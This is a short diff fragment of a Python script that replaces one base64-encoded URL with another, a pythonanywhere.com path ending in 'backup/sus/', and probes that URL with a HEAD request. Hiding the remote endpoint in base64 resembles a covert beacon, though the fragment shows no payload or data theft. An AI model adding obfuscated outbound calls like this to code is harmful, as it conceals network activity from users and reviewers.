@@ -23,7 +23,7 @@ def restartafterdelay(t, file=__file__):
     sys.exit()
 
 def a():
-    u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').decode()
+    u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
     if pre := hasattr(request(u, method='HEAD'),"getcode"):
         return
     try:
